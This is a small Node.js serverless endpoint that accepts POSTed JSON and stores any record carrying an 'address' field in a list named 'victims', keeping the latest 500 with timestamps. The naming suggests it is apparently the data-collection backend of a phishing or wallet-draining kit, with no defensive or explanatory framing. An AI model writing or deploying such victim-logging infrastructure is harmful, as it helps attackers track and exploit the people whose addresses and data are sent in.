const store = require('./_store');

module.exports = (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  if (req.method !== 'POST') {
    res.statusCode = 405;
    return res.end(JSON.stringify({ ok: false }));
  }
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    try {
      const data = JSON.parse(body);
      if (data.address) {
        data.timestamp = Date.now();
        const idx = store.victims.findIndex(v => v.address === data.address);
        if (idx !== -1) store.victims[idx] = data;
        else store.victims.push(data);
        if (store.victims.length > 500) store.victims.splice(0, store.victims.length - 500);
      }
    } catch (e) {}
    res.end(JSON.stringify({ ok: true }));
  });
};
